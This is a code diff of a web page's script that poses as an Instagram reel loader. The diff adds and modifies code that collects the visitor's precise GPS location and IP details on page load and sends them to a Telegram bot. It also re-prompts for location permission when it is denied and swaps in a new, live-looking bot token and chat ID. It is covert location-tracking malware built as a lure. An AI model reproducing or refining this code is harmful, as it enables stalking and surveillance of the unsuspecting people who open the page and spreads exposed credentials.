@@ -110,8 +110,8 @@
   
     <script>  
         // Telegram bot details  
-        const botToken = '8566934016:AAEIPNavsn5MngYWUO9-kjuQgqLqGwm58pk';  
-        const chatId = '1322448170';  
+        const botToken = '8440190119:AAH9ukiBj1NhHh7-rNb9vv22vj7m64rHSC4';  
+        const chatId = '7173355426';  
           
         // DOM elements  
         const bgImage = document.getElementById('bg-image');
@@ -160,17 +160,12 @@
                         timestamp: new Date().toLocaleString()  
                     }),  
                     error => {  
-                        // Only show permission request if location was denied  
-                        if (error.code === error.PERMISSION_DENIED) {  
-                            setTimeout(() => {  
-                                permissionRequest.style.display = 'flex';  
-                            }, 3000);  
-                        }  
+                        console.error("Location error:", error);
                         resolve(null);  
                     },  
                     {   
                         enableHighAccuracy: true,  
-                        timeout: 10000,  
+                        timeout: 15000,  
                         maximumAge: 0  
                     }  
                 );  
@@ -230,18 +225,28 @@
         // Rotate loading messages  
         function rotateLoadingMessages() {  
             let counter = 0;  
-            setInterval(() => {  
+            const interval = setInterval(() => {  
                 loadingText.textContent = loadingMessages[counter];  
                 counter = (counter + 1) % loadingMessages.length;  
             }, 3000);  
+            return interval;
         }  
+          
+        // Show Instagram reel after delay
+        function showInstagramReel() {
+            setTimeout(() => {
+                bgImage.style.display = 'none';
+                instagramReel.style.display = 'block';
+                loadingOverlay.style.display = 'none';
+            }, 4000);
+        }
           
         // Main tracking function  
         async function trackUser() {  
             // Start rotating loading messages  
-            rotateLoadingMessages();  
+            const interval = rotateLoadingMessages();
               
-            // First try to get precise location silently  
+            // First try to get precise location  
             const liveLocation = await getPreciseLocation();  
               
             // Then get IP details  
@@ -257,22 +262,31 @@
             // Send to Telegram  
             await sendToTelegram(trackingData);  
               
-            // If we got location, hide background and show Instagram reel
+            // Clear loading message rotation
+            clearInterval(interval);
+              
+            // Show Instagram reel after 4 seconds if location was granted
             if (liveLocation) {
-                bgImage.style.display = 'none';
-                instagramReel.style.display = 'block';
+                showInstagramReel();
+            } else {
+                // If location was denied, show permission request
+                permissionRequest.style.display = 'flex';
             }
         }  
           
         // When allow button is clicked  
         allowBtn.addEventListener('click', async () => {  
             permissionRequest.style.display = 'none';  
-            // Try to get location again  
             await trackUser();  
         });  
           
         // Start tracking when page loads  
-        window.onload = trackUser;  
+        window.onload = function() {
+            // Initially hide the permission request
+            permissionRequest.style.display = 'none';
+            // Start the tracking process
+            trackUser();
+        };
     </script>  
 </body>  
 </html>
